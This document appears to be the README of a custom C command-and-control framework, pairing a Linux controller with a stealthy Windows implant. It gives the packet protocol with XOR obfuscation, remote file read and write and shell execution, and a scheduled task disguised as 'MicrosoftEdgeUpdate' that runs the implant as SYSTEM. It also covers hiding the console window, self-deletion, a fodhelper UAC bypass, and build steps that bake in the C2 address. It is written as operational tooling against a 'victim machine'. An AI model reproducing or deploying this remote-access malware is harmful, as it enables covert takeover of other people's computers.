# C2 Server and Implant

A custom command-and-control framework written in C. The controller runs on Linux inside Docker; the implant cross-compiles to a Windows executable via mingw-w64.

## Components

- **`src/controller.c`** — Linux C2 listener. Accepts implant connections and presents an interactive command menu.
- **`src/implant.c`** — Windows implant. Connects back to the controller, executes received commands, and returns output.
- **`src/protocol.c`** — Shared packet serialization, XOR+rotate obfuscation, send/receive helpers used by both sides.
- **`src/implant_utils.c`** — Windows platform helpers (OS info, popen, sleep).
- **`src/controller_utils.c`** — Controller-side helpers (stdin flushing).

## Protocol

Packets have a 12-byte header followed by an optional payload:

| Field | Size | Description |
|---|---|---|
| command_type | 4 bytes | Command enum (HELLO, HEARTBEAT, RUN_CMD, etc.) |
| request_id | 4 bytes | Monotonic counter matched between request and response |
| payload_len | 4 bytes | Length of payload in bytes (0 = no payload) |
| payload | variable | Command-specific data |

All packets are obfuscated with XOR (16-byte rotating key) followed by a 3-bit left rotation before sending, and reversed on receive.

## Controller

### Prompt and Status Header

Every command prompt displays a status header showing whether persistence is active on the current implant:

```
+------------------------------------+
| C2 Controller                      |
| Persistence: ENABLED               |
+------------------------------------+
Select a command:
  1 - HEARTBEAT
  2 - SET_SLEEP
  3 - SHUTDOWN     (removes implant + task)
  4 - READ_DATA
  5 - WRITE_DATA
  6 - RUN_CMD
  7 - ENABLE PERSISTENCE
>
```

Persistence states:

| Status | Meaning |
|---|---|
| `UNKNOWN` | Auto-detection failed (connection issue during check) |
| `DISABLED` | Scheduled task does not exist on the target |
| `ENABLED` | Scheduled task exists — implant survives reboots |

### Auto-Detection on Connect

Immediately after receiving the HELLO packet, the controller silently sends a `RUN_CMD` that queries whether the scheduled task exists:

```
schtasks /query /tn "MicrosoftEdgeUpdate" >nul 2>&1 && echo TASK_EXISTS || echo TASK_MISSING
```

The response is parsed and the persistence header is updated before the first prompt is shown. No manual check needed.

### Reconnect Loop

The controller runs an outer `while(1)` loop around `accept()`. When an implant disconnects unexpectedly (machine turned off, network drop), the controller does **not** exit — it closes the dead socket and loops back to `accept()`, waiting for the implant to reconnect:

```
Outer loop:
  accept()  ←─────────────────────────────────┐
  receive HELLO                                │
  auto-detect persistence                      │
  Inner loop:                                  │
    show prompt + status header                │
    get command input                          │
    send command                               │
    if response NULL (connection lost) → break─┘  (wait for reconnect)
    if SHUTDOWN → exit cleanly
```

Previously the controller called `exit(1)` on any connection error, which meant a rebooted victim machine could never reconnect without a manual Docker container restart.

### `SO_REUSEADDR`

Added to the server socket so the controller can rebind port 4444 immediately after a container restart without hitting "address already in use" errors.

## Commands

| # | Command | Description |
|---|---|---|
| 1 | HEARTBEAT | Sends a ping; expects `ALIVE` back. Confirms the connection is live. |
| 2 | SET_SLEEP | Implant disconnects, sleeps N seconds, reconnects. Controller waits at `accept()`. |
| 3 | SHUTDOWN | Implant deletes the scheduled task and `i.exe`, sends confirmation, exits. Controller exits cleanly. |
| 4 | READ_DATA | Reads a file at a given path on the target and returns its contents. |
| 5 | WRITE_DATA | Writes arbitrary data to a file at a given path on the target. |
| 6 | RUN_CMD | Runs a shell command on the target via `popen` and returns stdout. |
| 7 | ENABLE PERSISTENCE | Creates a scheduled task on the target. Updates the persistence header on success. |

## Implant

### Connection and Retry

The implant connects to the C2 server at startup using the IP baked in at compile time (`-DC2_DEFAULT_HOST`). If the connection fails, it retries every 30 seconds indefinitely:

```c
while (implant_fd == -1) {
    implant_fd = connect_to_controller();
    if (implant_fd == -1)
        SLEEP(30);
}
```

This is critical for boot persistence — when the implant runs via a scheduled task on startup, the C2 server may not be reachable immediately. The retry loop ensures it connects as soon as the server is available. The same retry logic applies after waking from `SET_SLEEP`.

### Persistence (Scheduled Task)

Use command `7 - ENABLE PERSISTENCE` from the controller, or run manually via `RUN_CMD`:

```
schtasks /create /tn "MicrosoftEdgeUpdate" /tr "C:\Users\Public\i.exe" /sc ONLOGON /ru SYSTEM /rl HIGHEST /f
```

- `/sc ONLOGON` — triggers on user login (network is available at this point)
- `/ru SYSTEM` — runs as SYSTEM (highest privilege, full network access)
- `/rl HIGHEST` — highest run level
- `/tn "MicrosoftEdgeUpdate"` — disguised as a legitimate Windows task name

### Shutdown and Cleanup

When the controller issues `SHUTDOWN`, the implant:
1. Deletes the scheduled task: `schtasks /delete /tn "MicrosoftEdgeUpdate" /f`
2. Deletes its own executable: `del /f /q "C:\Users\Public\i.exe"`
3. Sends the confirmation response
4. Exits

Windows allows deleting a running executable (`FILE_SHARE_DELETE`). The file is unlinked from the directory immediately and disk space is reclaimed when the process exits. The cleanup is `#ifdef _WIN32` guarded so the Linux build still compiles cleanly.

### Console Window

The Windows implant is compiled with `-mwindows` (GUI subsystem), which suppresses the console window entirely. The implant runs invisibly in the background.

## Verifying Admin Privileges

The implant runs as Administrator via the fodhelper UAC bypass embedded in the stager shellcode. Confirm after connecting via `RUN_CMD`:

```
whoami /groups
```

Look for `Mandatory Label\High Mandatory Level` — confirms elevation. Or:

```
net session
```

Returns session info → Administrator. Returns `Access is denied` → not elevated.

## Build

```bash
# Handled automatically by the Docker build
make C2_HOST_IP=<host-ip>

# Outputs:
#   bin/linux/controller    — Linux C2 controller
#   bin/linux/implant       — Linux implant (for testing)
#   bin/windows/implant.exe — Windows implant (active payload)
```

Windows implant compile flags: `-O2 -mwindows -static -lws2_32`
